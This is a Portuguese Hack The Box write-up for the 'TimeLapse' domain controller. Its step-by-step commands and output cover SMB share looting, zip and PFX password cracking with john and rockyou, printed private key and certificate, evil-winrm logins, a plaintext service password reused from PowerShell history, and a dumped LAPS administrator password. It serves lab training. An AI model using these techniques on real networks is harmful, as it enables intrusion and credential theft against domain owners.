# TimeLapse

Enumerando a maquina de destino com Nmap

~~~ py
nmap -sC -sV -A 10.10.11.152 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-16 13:25 -03
Nmap scan report for 10.10.11.152
Host is up (0.21s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec?
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h19m29s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-05-17T00:46:42
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   198.55 ms 10.10.14.1
2   198.58 ms 10.10.11.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.26 seconds
~~~

Procurando mais portas abertas 

~~~ py
nmap -p- -T4 10.10.11.152 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-16 14:37 -03
Nmap scan report for 10.10.11.152
Host is up (0.20s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49696/tcp open  unknown
52791/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 462.99 seconds
~~~

Procurando portas UDP

~~~ py
 nmap -p 1-500 -sU -T4 10.10.11.152 -Pn                                                                                      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-16 14:49 -03
Nmap scan report for 10.10.11.152
Host is up (0.20s latency).
Not shown: 497 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
389/udp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 15.01 seconds

~~~

A porta 53 está em execução `domain` como `dns/udp` e na porta 88 tem kerberos-sec e na porta 389 tem `ldap` a partir disso, podemos supor que este é um controlador de dominio.

---

Enumerando o protocolo SMB 

~~~ py
smbmap -H 10.10.11.152 -u "" -p ""
[+] IP: 10.10.11.152:445	Name: 10.10.11.152       
~~~

~~~ py
smbclient -L //10.10.11.152/ -N   

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
~~~

~~~ py
smbclient //10.10.11.152/Shares/
smb: \> cd Dev
smb: \> get winrm_backup.zip
~~~ 

O arquivo zip esta protegido por uma senha 

~~~ py 
fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt


PASSWORD FOUND!!!!: pw == supremelegacy
~~~

ao descompactar o arquivo  é revelado um arquivo PFX

~~~ py
unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
~~~

convertendo o arquivo `pfx` para hash compativel com John usando o pfx2john

~~~ py
pfx2john legacy_dev_auth.pfx >pfx_timelapse.hash
~~~ 

quebrando a senha do arquivo 

~~~ py
john -w=/usr/share/wordlists/rockyou.txt pfx_timelapse.hash --rule /usr/share/john/rules/rockyou-30000.rule
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 SSE2 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:37 0.36% (ETA: 15:41:42) 0g/s 18875p/s 18875c/s 18875C/s usncvn67..usmc1371
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:02:51 DONE (2022-05-17 03:42) 0.005844g/s 18886p/s 18886c/s 18886C/s thuglife06..thug211
~~~ 

Agora usando a senha do arquivo `pfx`é possivel exportar o certificado e arquivo de chave

Extraindo a chave privada

~~~ py
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
cat priv-key.pem                                                         
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClVgejYhZHHuLz
TSOtYXHOi56zSocr9om854YDu/6qHBa4Nf8xFP6INNBNlYWvAxCvKM8aQsHpv3to
pwpQ+YbRZDu1NxyhvfNNTRXjdFQV9nIiKkowOt6gG2F+9O5gVF4PAnHPm+YYPwsb
oRkYV8QOpzIi6NMZgDCJrgISWZmUHqThybFW/7POme1gs6tiN1XFoPu1zNOYaIL3
dtZaazXcLw6IpTJRPJAWGttqyFommYrJqCzCSaWu9jG0p1hKK7mk6wvBSR8QfHW2
qX9+NbLKegCt+/jAa6u2V9lu+K3MC2NaSzOoIi5HLMjnrujRoCx3v6ZXL0KPCFzD
MEqLFJHxAgMBAAECggEAc1JeYYe5IkJY6nuTtwuQ5hBc0ZHaVr/PswOKZnBqYRzW
fAatyP5ry3WLFZKFfF0W9hXw3tBRkUkOOyDIAVMKxmKzguK+BdMIMZLjAZPSUr9j
PJFizeFCB0sR5gvReT9fm/iIidaj16WhidQEPQZ6qf3U6qSbGd5f/KhyqXn1tWnL
GNdwA0ZBYBRaURBOqEIFmpHbuWZCdis20CvzsLB+Q8LClVz4UkmPX1RTFnHTxJW0
Aos+JHMBRuLw57878BCdjL6DYYhdR4kiLlxLVbyXrP+4w8dOurRgxdYQ6iyL4UmU
Ifvrqu8aUdTykJOVv6wWaw5xxH8A31nl/hWt50vEQQKBgQDYcwQvXaezwxnzu+zJ
7BtdnN6DJVthEQ+9jquVUbZWlAI/g2MKtkKkkD9rWZAK6u3LwGmDDCUrcHQBD0h7
tykwN9JTJhuXkkiS1eS3BiAumMrnKFM+wPodXi1+4wJk3YTWKPKLXo71KbLo+5NJ
2LUmvvPDyITQjsoZoGxLDZvLFwKBgQDDjA7YHQ+S3wYk+11q9M5iRR9bBXSbUZja
8LVecW5FDH4iTqWg7xq0uYnLZ01mIswiil53+5Rch5opDzFSaHeS2XNPf/Y//TnV
1+gIb3AICcTAb4bAngau5zm6VSNpYXUjThvrLv3poXezFtCWLEBKrWOxWRP4JegI
ZnD1BfmQNwKBgEJYPtgl5Nl829+Roqrh7CFti+a29KN0D1cS/BTwzusKwwWkyB7o
btTyQf4tnbE7AViKycyZVGtUNLp+bME/Cyj0c0t5SsvS0tvvJAPVpNejjc381kdN
71xBGcDi5ED2hVj/hBikCz2qYmR3eFYSTrRpo15HgC5NFjV0rrzyluZRAoGAL7s3
QF9Plt0jhdFpixr4aZpPvgsF3Ie9VOveiZAMh4Q2Ia+q1C6pCSYk0WaEyQKDa4b0
6jqZi0B6S71un5vqXAkCEYy9kf8AqAcMl0qEQSIJSaOvc8LfBMBiIe54N1fXnOeK
/ww4ZFfKfQd7oLxqcRADvp1st2yhR7OhrN1pfl8CgYEAsJNjb8LdoSZKJZc0/F/r
c2gFFK+MMnFncM752xpEtbUrtEULAKkhVMh6mAywIUWaYvpmbHDMPDIGqV7at2+X
TTu+fiiJkAr+eTa/Sg3qLEOYgU0cSgWuZI0im3abbDtGlRt2Wga0/Igw9Ewzupc8
A5ZZvI+GsHhm0Oab7PEWlRY=
-----END PRIVATE KEY-----
~~~

Extraindo o certificado 

~~~ py
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem     
 cat certificate.pem                                                      
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN = Legacyy

issuer=CN = Legacyy

-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----
~~~

Com esses arquivos é possivel realizar a autenticação via SSL utilizando o evil-winrm

~~~pu 
evil-winrm -S -k legacy.key -c legacy.cert -i 10.10.11.152
~~~

**User Flag**
> cd ..
> ls
> cd Desktop
> cat user.txt
> HTB{∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎}

----
Escalonamento de privilegios

Listando privilegios do usuario atual

~~~py
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
~~~

E verificar os usuarios da maquina

~~~ py
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd C:\Users\
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2021  11:27 AM                Administrator
d-----       10/25/2021   8:22 AM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy
d-----        2/23/2022   5:45 PM                TRX
~~~

Verificando privilegios com `net user`

~~~ py
*Evil-WinRM* PS C:\Users> net user legacyy
User name                    legacyy
Full Name                    Legacyy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/23/2021 12:17:10 PM
Password expires             Never
Password changeable          10/24/2021 12:17:10 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/17/2022 3:11:29 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Development
~~~

O grupo *Development* pode ser um alvo em potencial 

Ao rodar o WinPEAS.exe, ele mostra `PowerShell history file` como possivel vetor de ataque.

Consultando o caminho do arquivo de historico usando a variavel env 

~~~ py
*Evil-WinRM* PS C:\Users> cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> ls


    Directory: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt
~~~

O arquivo é utilizado para PS-Remoting

~~~ py
cat ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
~~~

Reutilizando as credenciais

~~~ py
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd C:\Users
*Evil-WinRM* PS C:\Users> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
*Evil-WinRM* PS C:\Users> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
*Evil-WinRM* PS C:\Users> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
~~~

Passando os comandos por `PS-Remoting` 

~~~ py
*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}

timelapse\svc_deploy
*Evil-WinRM* PS C:\Users> timelapse\svc_deploy
The module 'timelapse' could not be loaded. For more information, run 'Import-Module timelapse'.
At line:1 char:1
+ timelapse\svc_deploy
+ ~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (timelapse\svc_deploy:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CouldNotAutoLoadModule
*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {hostname}
dc01

*Evil-WinRM* PS C:\Users> dc01
The term 'dc01' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ dc01
+ ~~~~
    + CategoryInfo          : ObjectNotFound: (dc01:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
~~~

Agora é possivel consultar esta sessão como `svc_deploy` 
Verificando os privilegios deste usuário

~~~py
*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami /priv}

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
~~~

Verificando associações de grupo usando `net user`

~~~ py
*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/23/2022 7:16:40 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
~~~

Então esse usuário `svc_deploy`é membro de `LAPS_Readers`grupo usando o qual podemos extrair `Local Administrator`senha

----

Verificando a senha do LAPS usando AD-Module

~~~ py
PSComputerName              : localhost
RunspaceId                  : a4ee9b27-4421-4b6b-868a-6d63c782a176
DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                 : dc01.timelapse.htb
Enabled                     : True
ms-Mcs-AdmPwd               : a7+7PLZqf.g8#s6ee8!9,qsH
ms-Mcs-AdmPwdExpirationTime : 132982826759948029
Name                        : DC01
ObjectClass                 : computer
ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName              : DC01$
SID                         : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName           :

PSComputerName    : localhost
RunspaceId        : a4ee9b27-4421-4b6b-868a-6d63c782a176
DistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : DB01
ObjectClass       : computer
ObjectGUID        : d38b3265-230f-47ae-bdcd-f7153da7659d
SamAccountName    : DB01$
SID               : S-1-5-21-671920749-559770252-3318990721-1606
UserPrincipalName :

PSComputerName    : localhost
RunspaceId        : a4ee9b27-4421-4b6b-868a-6d63c782a176
DistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : WEB01
ObjectClass       : computer
ObjectGUID        : 897c7cfe-ba15-4181-8f2c-a74f88952683
SamAccountName    : WEB01$
SID               : S-1-5-21-671920749-559770252-3318990721-1607
UserPrincipalName :

PSComputerName    : localhost
RunspaceId        : a4ee9b27-4421-4b6b-868a-6d63c782a176
DistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : DEV01
ObjectClass       : computer
ObjectGUID        : 02dc961a-7a60-4ec0-a151-0472768814ca
SamAccountName    : DEV01$
SID               : S-1-5-21-671920749-559770252-3318990721-1608
UserPrincipalName :
~~~

Podemos ver a senha do Administrador local de `DC01$`
Vamos usar `evil-winrm`para `PS-Remote`com esta credencial

~~~ py
evil-winrm -u 'Administrator' -p 'a7+7PLZqf.g8#s6ee8!9,qsH' -i 10.10.11.152 -S
~~~

**Root Flag**
> cd TRX/Desktop
> cat root.txt
> HTB{∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎}


